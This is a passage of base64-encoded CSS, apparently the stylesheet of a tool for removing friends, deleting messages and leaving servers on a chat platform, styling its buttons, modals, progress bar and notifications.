Q7IGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OyBmb250LXdlaWdodDogNjAwICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3dyYXAgIWltcG9ydGFudDsgb3ZlcmZsb3c6IGhpZGRlbiAhaW1wb3J0YW50OyB0ZXh0LW92ZXJmbG93OiBlbGxpcHNpcyAhaW1wb3J0YW50OyBtYXJnaW46IDAgIWltcG9ydGFudDsgcGFkZGluZzogMCAhaW1wb3J0YW50OyB9CgogICAgICAgIC5kZm0tZnJpZW5kLWFjdGlvbnMsIC5kZm0tc2VydmVyLWFjdGlvbnMgeyBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7IGdhcDogOHB4ICFpbXBvcnRhbnQ7IGZsZXgtc2hyaW5rOiAwICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1yZW1vdmUsIC5kZm0tZGVsZXRlLW1lc3NhZ2VzLCAuZGZtLWxlYXZlLXNlcnZlciB7CiAgICAgICAgICAgIGJvcmRlcjogbm9uZSAhaW1wb3J0YW50OyBwYWRkaW5nOiA4cHggMTZweCAhaW1wb3J0YW50OyBib3JkZXItcmFkaXVzOiA2cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxM3B4ICFpbXBvcnRhbnQ7IGZvbnQtd2VpZ2h0OiA2MDAgIWltcG9ydGFudDsgY3Vyc29yOiBwb2ludGVyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjE1cyBlYXNlICFpbXBvcnRhbnQ7IGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3dyYXAgIWltcG9ydGFudDsgbWFyZ2luOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQogICAgICAgIC5kZm0tcmVtb3ZlIHsgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgI2VkNDI0NSAwJSwgI2MwMzUzNyAxMDAlKSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1kZWxldGUtbWVzc2FnZXMgeyBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjZmFhNjFhIDAlLCAjZDY4YTE1IDEwMCUpICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWxlYXZlLXNlcnZlciB7IGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICNlZDQyNDUgMCUsICNjMDM1MzcgMTAwJSkgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tcmVtb3ZlOmhvdmVyLCAuZGZtLWRlbGV0ZS1tZXNzYWdlczpob3ZlciwgLmRmbS1sZWF2ZS1zZXJ2ZXI6aG92ZXIgeyBmaWx0ZXI6IGJyaWdodG5lc3MoMS4xKSAhaW1wb3J0YW50OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTFweCkgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tcmVtb3ZlOmFjdGl2ZSwgLmRmbS1kZWxldGUtbWVzc2FnZXM6YWN0aXZlLCAuZGZtLWxlYXZlLXNlcnZlcjphY3RpdmUgeyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCkgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tcmVtb3ZlOmRpc2FibGVkLCAuZGZtLWRlbGV0ZS1tZXNzYWdlczpkaXNhYmxlZCwgLmRmbS1sZWF2ZS1zZXJ2ZXI6ZGlzYWJsZWQgeyBvcGFjaXR5OiAwLjUgIWltcG9ydGFudDsgY3Vyc29yOiBub3QtYWxsb3dlZCAhaW1wb3J0YW50OyB0cmFuc2Zvcm06IG5vbmUgIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLWxvYWRpbmcgeyB0ZXh0LWFsaWduOiBjZW50ZXIgIWltcG9ydGFudDsgY29sb3I6ICM4ODg4ODggIWltcG9ydGFudDsgcGFkZGluZzogNjBweCAyMHB4ICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OyBmb250LXdlaWdodDogNTAwICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWxvYWRpbmc6OmFmdGVyIHsgY29udGVudDogJy4uLicgIWltcG9ydGFudDsgYW5pbWF0aW9uOiBkb3RzIDEuNXMgc3RlcHMoNCwgZW5kKSBpbmZpbml0ZSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1lbXB0eSB7IHRleHQtYWxpZ246IGNlbnRlciAhaW1wb3J0YW50OyBjb2xvcjogIzY2NjY2NiAhaW1wb3J0YW50OyBwYWRkaW5nOiA2MHB4IDIwcHggIWltcG9ydGFudDsgZm9udC1zaXplOiAxNHB4ICFpbXBvcnRhbnQ7IGZvbnQtd2VpZ2h0OiA1MDAgIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLW1vZGFsIHsKICAgICAgICAgICAgcG9zaXRpb246IGZpeGVkICFpbXBvcnRhbnQ7IHRvcDogMCAhaW1wb3J0YW50OyBsZWZ0OiAwICFpbXBvcnRhbnQ7IHdpZHRoOiAxMDAlICFpbXBvcnRhbnQ7IGhlaWdodDogMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDAsIDAsIDAsIDAuOCkgIWltcG9ydGFudDsgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OyBhbGlnbi1pdGVtczogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyICFpbXBvcnRhbnQ7IHotaW5kZXg6IDEwMDAwMDAgIWltcG9ydGFudDsgcGFkZGluZzogMjBweCAhaW1wb3J0YW50OyBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoNHB4KSAhaW1wb3J0YW50OwogICAgICAgIH0KICAgICAgICAuZGZtLW1vZGFsLWNvbnRlbnQgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTQ1ZGVnLCAjMWExYTFhIDAlLCAjMTQxNDE0IDEwMCUpICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDI0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMTJweCAhaW1wb3J0YW50OyBtYXgtd2lkdGg6IDQyMHB4ICFpbXBvcnRhbnQ7IHdpZHRoOiAxMDAlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFuaW1hdGlvbjogbW9kYWxGYWRlSW4gMC4ycyBlYXNlICFpbXBvcnRhbnQ7IGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xKSAhaW1wb3J0YW50OwogICAgICAgIH0KICAgICAgICAuZGZtLW1vZGFsLXRpdGxlIHsgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsgZm9udC1zaXplOiAxOHB4ICFpbXBvcnRhbnQ7IGZvbnQtd2VpZ2h0OiA3MDAgIWltcG9ydGFudDsgbWFyZ2luOiAwIDAgMTJweCAwICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDAgIWltcG9ydGFudDsgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLW1vZGFsLXRleHQgeyBjb2xvcjogI2IwYjBiMCAhaW1wb3J0YW50OyBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsgbWFyZ2luOiAwIDAgMjBweCAwICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDAgIWltcG9ydGFudDsgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7IGxpbmUtaGVpZ2h0OiAxLjUgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbW9kYWwtYWN0aW9ucyB7IGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsgZ2FwOiAxMHB4ICFpbXBvcnRhbnQ7IGp1c3RpZnktY29udGVudDogY2VudGVyICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLW1vZGFsLWFjdGlvbnMgLmRmbS1idG4geyBmbGV4OiAxICFpbXBvcnRhbnQ7IG1heC13aWR0aDogMTUwcHggIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLXByb2dyZXNzLWNvbnRhaW5lciB7IGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wNSkgIWltcG9ydGFudDsgYm9yZGVyLXJhZGl1czogOHB4ICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDE2cHggIWltcG9ydGFudDsgbWFyZ2luLXRvcDogMTJweCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1wcm9ncmVzcy10ZXh0IHsgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsgZm9udC1zaXplOiAxNHB4ICFpbXBvcnRhbnQ7IGZvbnQtd2VpZ2h0OiA2MDAgIWltcG9ydGFudDsgbWFyZ2luOiAwIDAgMTBweCAwICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDAgIWltcG9ydGFudDsgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLXByb2dyZXNzLWJhci1jb250YWluZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDAsIDAsIDAsIDAuMykgIWltcG9ydGFudDsgYm9yZGVyLXJhZGl1czogNHB4ICFpbXBvcnRhbnQ7IGhlaWdodDogNnB4ICFpbXBvcnRhbnQ7IG92ZXJmbG93OiBoaWRkZW4gIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tcHJvZ3Jlc3MtYmFyIHsgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDkwZGVnLCAjNTg2NWYyLCAjNDc1MmM0KSAhaW1wb3J0YW50OyBoZWlnaHQ6IDEwMCUgIWltcG9ydGFudDsgYm9yZGVyLXJhZGl1czogNHB4ICFpbXBvcnRhbnQ7IHRyYW5zaXRpb246IHdpZHRoIDAuM3MgZWFzZSAhaW1wb3J0YW50OyB3aWR0aDogMCAhaW1wb3J0YW50OyB9CgogICAgICAgICNkZm0tbm90aWZpY2F0aW9uLWNvbnRhaW5lciB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZCAhaW1wb3J0YW50OyBib3R0b206IDIwcHggIWltcG9ydGFudDsgcmlnaHQ6IDIwcHggIWltcG9ydGFudDsgei1pbmRleDogOTk5OTk5OSAhaW1wb3J0YW50OwogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW4gIWltcG9ydGFudDsgZ2FwOiAxMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBvaW50ZXItZXZlbnRzOiBub25lICFpbXBvcnRhbnQ7IG1heC13aWR0aDogMzYwcHggIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24gewogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMWExYTFhIDAlLCAjMTQxNDE0IDEwMCUpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xKSAhaW1wb3J0YW50OyBib3JkZXItcmFkaXVzOiA4cHggIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMTRweCAxNnB4ICFpbXBvcnRhbnQ7IG1pbi13aWR0aDogMzAwcHggIWltcG9ydGFudDsgYW5pbWF0aW9uOiBzbGlkZUluUmlnaHQgMC4zcyBlYXNlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBvaW50ZXItZXZlbnRzOiBhbGwgIWltcG9ydGFudDsgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OyBhbGlnbi1pdGVtczogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGdhcDogMTJweCAhaW1wb3J0YW50OyBwb3NpdGlvbjogcmVsYXRpdmUgIWltcG9ydGFudDsgb3ZlcmZsb3c6IGhpZGRlbiAhaW1wb3J0YW50OwogICAgICAgIH0KICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbjo6YmVmb3JlIHsgY29udGVudDogJycgIWltcG9ydGFudDsgcG9zaXRpb246IGFic29sdXRlICFpbXBvcnRhbnQ7IGxlZnQ6IDAgIWltcG9ydGFudDsgdG9wOiAwICFpbXBvcnRhbnQ7IGhlaWdodDogMTAwJSAhaW1wb3J0YW50OyB3aWR0aDogNHB4ICFpbXBvcnRhbnQ7IGJhY2tncm91bmQ6IHZhcigtLW5vdGlmaWNhdGlvbi1jb2xvcikgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLnJlbW92aW5nIHsgYW5pbWF0aW9uOiBzbGlkZU91dFJpZ2h0IDAuMjVzIGVhc2UgZm9yd2FyZHMgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLnN1Y2Nlc3MgeyAtLW5vdGlmaWNhdGlvbi1jb2xvcjogIzQzYjU4MSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24uZXJyb3IgeyAtLW5vdGlmaWNhdGlvbi1jb2xvcjogI2VkNDI0NSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24ud2FybmluZyB7IC0tbm90aWZpY2F0aW9uLWNvbG9yOiAjZmFhNjFhICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi5pbmZvIHsgLS1ub3RpZmljYXRpb24tY29sb3I6ICM1ODY1ZjIgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLmZyaWVuZC1yZW1vdmVkLCAuZGZtLW5vdGlmaWNhdGlvbi5zZXJ2ZXItbGVmdCwgLmRmbS1ub3RpZmljYXRpb24uc2VydmVyLW11dGVkIHsgLS1ub3RpZmljYXRpb24tY29sb3I6ICNlZDQyNDUgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLnNlcnZlci1tdXRlZCB7IC0tbm90aWZpY2F0aW9uLWNvbG9yOiAjNDNiNTgxICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24taWNvbiB7IGZvbnQtc2l6ZTogMjBweCAhaW1wb3J0YW50OyBmbGV4LXNocmluazogMCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24uc3VjY2VzcyAuZGZtLW5vdGlmaWNhdGlvbi1pY29uIHsgY29sb3I6ICM0M2I1ODEgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLmVycm9yIC5kZm0tbm90aWZpY2F0aW9uLWljb24geyBjb2xvcjogI2VkNDI0NSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24ud2FybmluZyAuZGZtLW5vdGlmaWNhdGlvbi1pY29uIHsgY29sb3I6ICNmYWE2MWEgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLmluZm8gLmRmbS1ub3RpZmljYXRpb24taWNvbiB7IGNvbG9yOiAjNTg2NWYyICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24tY29udGVudCB7IGZsZXg6IDEgIWltcG9ydGFudDsgbWluLXdpZHRoOiAwICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi10aXRsZSB7IGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OyBmb250LXdlaWdodDogNjAwICFpbXBvcnRhbnQ7IG1hcmdpbjogMCAwIDJweCAwICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDAgIWltcG9ydGFudDsgbGluZS1oZWlnaHQ6IDEuMyAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24tbWVzc2FnZSB7IGNvbG9yOiAjYjBiMGIwICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTNweCAhaW1wb3J0YW50OyBsaW5lLWhlaWdodDogMS40ICFpbXBvcnRhbnQ7IHdvcmQtd3JhcDogYnJlYWstd29yZCAhaW1wb3J0YW50OyBtYXJnaW46IDAgIWltcG9ydGFudDsgcGFkZGluZzogMCAhaW1wb3J0YW50OyB9CgogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLWNsb3NlIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA4KSAhaW1wb3J0YW50OyBib3JkZXI6IG5vbmUgIWltcG9ydGFudDsgY29sb3I6ICM4ODg4ODggIWltcG9ydGFudDsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyICFpbXBvcnRhbnQ7IHdpZHRoOiAyNHB4ICFpbXBvcnRhbnQ7IGhlaWdodDogMjRweCAhaW1wb3J0YW50OyBtaW4td2lkdGg6IDI0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWluLWhlaWdodDogMjRweCAhaW1wb3J0YW50OyBib3JkZXItcmFkaXVzOiA0cHggIWltcG9ydGFudDsgdHJhbnNpdGlvbjogYWxsIDAuMTVzIGVhc2UgIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4ICFpbXBvcnRhbnQ7IGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsgYWxpZ24taXRlbXM6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlciAhaW1wb3J0YW50OyBmbGV4LXNocmluazogMCAhaW1wb3J0YW50OyBwYWRkaW5nOiAwICFpbXBvcnRhbnQ7IG1hcmdpbjogMCAhaW1wb3J0YW50OwogICAgICAgIH0KICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi1jbG9zZTpob3ZlciB7IGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xNSkgIWltcG9ydGFudDsgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLWZyaWVuZC1yZW1vdmVkLWNvbnRlbnQsIC5kZm0tc2VydmVyLWxlZnQtY29udGVudCB7IGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsgYWxpZ24taXRlbXM6IGNlbnRlciAhaW1wb3J0YW50OyBnYXA6IDEwcHggIWltcG9ydGFudDsgd2lkdGg6IDEwMCUgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tZnJpZW5kLXJlbW92ZWQtYXZhdGFyLCAuZGZtLXNlcnZlci1sZWZ0LWljb24gewogICAgICAgICAgICB3aWR0aDogMzZweCAhaW1wb3J0YW50OyBoZWlnaHQ6IDM2cHggIWltcG9ydGFudDsgbWluLXdpZHRoOiAzNnB4ICFpbXBvcnRhbnQ7IG1pbi1oZWlnaHQ6IDM2cHggIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNTAlICFpbXBvcnRhbnQ7IGJvcmRlcjogMnB4IHNvbGlkIHJnYmEoMjM3LCA2NiwgNjksIDAuMykgIWltcG9ydGFudDsgZmxleC1zaHJpbms6IDAgIWltcG9ydGFudDsgb2JqZWN0LWZpdDogY292ZXIgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1zZXJ2ZXItbGVmdC1pY29uIHsgYm9yZGVyLXJhZGl1czogOHB4ICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWZyaWVuZC1yZW1vdmVkLWluZm8sIC5kZm0tc2VydmVyLWxlZnQtaW5mbyB7IGZsZXg6IDEgIWltcG9ydGFudDsgbWluLXdpZHRoOiAwICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWZyaWVuZC1yZW1vdmVkLW5hbWUsIC5kZm0tc2VydmVyLWxlZnQtbmFtZSB7CiAgICAgICAgICAgIGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OyBmb250LXdlaWdodDogNjAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1hcmdpbjogMCAwIDJweCAwICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDAgIWltcG9ydGFudDsgd2hpdGUtc3BhY2U6IG5vd3JhcCAhaW1wb3J0YW50OwogICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuICFpbXBvcnRhbnQ7IHRleHQtb3ZlcmZsb3c6IGVsbGlwc2lzICFpbXBvcnRhbnQ7CiAgICAgICAgfQogICAgICAgIC5kZm0tZnJpZW5kLXJlbW92ZWQtdGV4dCwgLmRmbS1zZXJ2ZXItbGVmdC10ZXh0IHsgY29sb3I6ICM4ODg4ODggIWltcG9ydGFudDsgZm9udC1zaXplOiAxMnB4ICFpbXBvcnRhbnQ7IG1hcmdpbjogMCAhaW1wb3J0YW50OyBwYWRkaW5nOiAwICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1zZXR0aW5ncy1tb2RhbCB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZCAhaW1wb3J0YW50OyB0b3A6IDAgIWltcG9ydGFudDsgbGVmdDogMCAhaW1wb3J0YW50OyB3aWR0aDogMTAwJSAhaW1wb3J0YW50OyBoZWlnaHQ6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgwLCAwLCAwLCAwLjgpICFpbXBvcnRhbnQ7IGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsgYWxpZ24taXRlbXM6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlciAhaW1wb3J0YW50OyB6LWluZGV4OiAxMDAwMDAxICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDIwcHggIWltcG9ydGFudDsgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDRweCkgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1zZXR0aW5ncy1jb250ZW50IHsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDE0NWRlZywgIzFhMWExYSAwJSwgIzE0MTQxNCAxMDAlKSAhaW1wb3J0YW50OyBwYWRkaW5nOiAyNHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDEycHggIWltcG9ydGFudDsgbWF4LXdpZHRoOiAzODBweCAhaW1wb3J0YW50OyB3aWR0aDogMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICBhbmltYXRpb246IG1vZGFsRmFkZUluIDAuMnMgZWFzZSAhaW1wb3J0YW50OyBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSkgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1zZXR0aW5ncy10aXRsZSB7IGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMThweCAhaW1wb3J0YW50OyBmb250LXdlaWdodDogNzAwICFpbXBvcnRhbnQ7IG1hcmdpbjogMCAwIDIwcHggMCAhaW1wb3J0YW50OyBwYWRkaW5nOiAwICFpbXBvcnRhbnQ7IHRleHQtYWxpZ246IGNlbnRlciAhaW1wb3J0YW50OyB9CgogICAgICAgIC5kZm0tc2V0dGluZ3Mtb3B0aW9uIHsgbWFyZ2luOiAwIDAgMjBweCAwICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLXNldHRpbmdzLWxhYmVsIHsgY29sb3I6ICNiMGIwYjAgIWltcG9ydGFudDsgZm9udC1zaXplOiAxNHB4ICFpbXBvcnRhbnQ7IG1hcmdpbjogMCAwIDhweCAwICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDAgIWltcG9ydGFudDsgZGlzcGxheTogYmxvY2sgIWltcG9ydGFudDsgZm9udC13ZWlnaHQ6IDUwMCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1zZXR0aW5ncy1zZWxlY3QgewogICAgICAgICAgICB3aWR0aDogMTAwJSAhaW1wb3J0YW50OyBwYWRkaW5nOiAxMnB4IDQwcHggMTJweCAxNHB4ICFpbXBvcnRhbnQ7IGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wNikgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7IGJvcmRlci1yYWRpdXM6IDhweCAhaW1wb3J0YW50OwogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OyBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsgY3Vyc29yOiBwb2ludGVyICFpbXBvcnRhbnQ7IGFwcGVhcmFuY2U6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogdXJsKCJkYXRhOmltYWdlL3N2Zyt4bWw7Y2hhcnNldD1VVEYtOCwlM2NzdmcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2aWV3Qm94PScwIDAgMjQgMjQnIGZpbGw9JyUyMzg4OCclM2UlM2NwYXRoIGQ9J003IDEwbDUgNSA1LTV6Jy8lM2UlM2Mvc3ZnJTNlIikgIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdCAhaW1wb3J0YW50OyBiYWNrZ3JvdW5kLXBvc2l0aW9uOiByaWdodCAxMnB4IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IDIwcHggIWltcG9ydGFudDsgdHJhbnNpdGlvbjogYWxsIDAuMTVzIGVhc2UgIWltcG9ydGFudDsgb3V0bGluZTogbm9uZSAhaW1wb3J0YW50OyBtYXJnaW46IDAgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1zZXR0aW5ncy1zZWxlY3Q6Zm9jdXMgeyBib3JkZXItY29sb3I6ICM1ODY1ZjIgIWltcG9ydGFudDsgYmFja2dyb3VuZC1jb2xvcjogcmdiYSg4OCwgMTAxLCAyNDIsIDAuMSkgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tc2V0dGluZ3Mtc2VsZWN0IG9wdGlvbiB7IGJhY2tncm91bmQ6ICMxYTFhMWEgIWltcG9ydGFudDsgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsgcGFkZGluZzogMTBweCAhaW1wb3J0YW50OyB9CgogICAgICAgIC5kZm0tYWR2YW5jZWQtc2VjdGlvbiB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wMykgIWltcG9ydGFudDsgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA4KSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAxMHB4ICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDIwcHggIWltcG9ydGFudDsgbWFyZ2luLWJvdHRvbTogMTZweCAhaW1wb3J0YW50OwogICAgICAgIH0KICAgICAgICAuZGZtLXNlY3Rpb24taGVhZGVyIHsgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OyBhbGlnbi1pdGVtczogY2VudGVyICFpbXBvcnRhbnQ7IGdhcDogMTBweCAhaW1wb3J0YW50OyBtYXJnaW4tYm90dG9tOiA4cHggIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tc2VjdGlvbi10aXRsZSB7IGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTZweCAhaW1wb3J0YW50OyBmb250LXdlaWdodDogNjAwICFpbXBvcnRhbnQ7IG1hcmdpbjogMCAwIDhweCAwICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLXNlY3Rpb24taGVhZGVyIC5kZm0tc2VjdGlvbi10aXRsZSB7IG1hcmdpbjogMCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1zZWN0aW9uLWRlc2NyaXB0aW9uIHsgY29sb3I6ICM4ODg4ODggIWltcG9ydGFudDsgZm9udC1zaXplOiAxM3B4ICFpbXBvcnRhbnQ7IGxpbmUtaGVpZ2h0OiAxLjUgIWltcG9ydGFudDsgbWFyZ2luOiAwIDAgMTZweCAwICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1pbnB1dC1ncm91cCB7IGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsgZ2FwOiAxMHB4ICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWlucHV0IHsKICAgICAgICAgICAgZmxleDogMSAhaW1wb3J0YW50OyBwYWRkaW5nOiAxMnB4IDE2cHggIWltcG9ydGFudDsgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA2KSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSkgIWltcG9ydGFudDsgYm9yZGVyLXJhZGl1czogOHB4I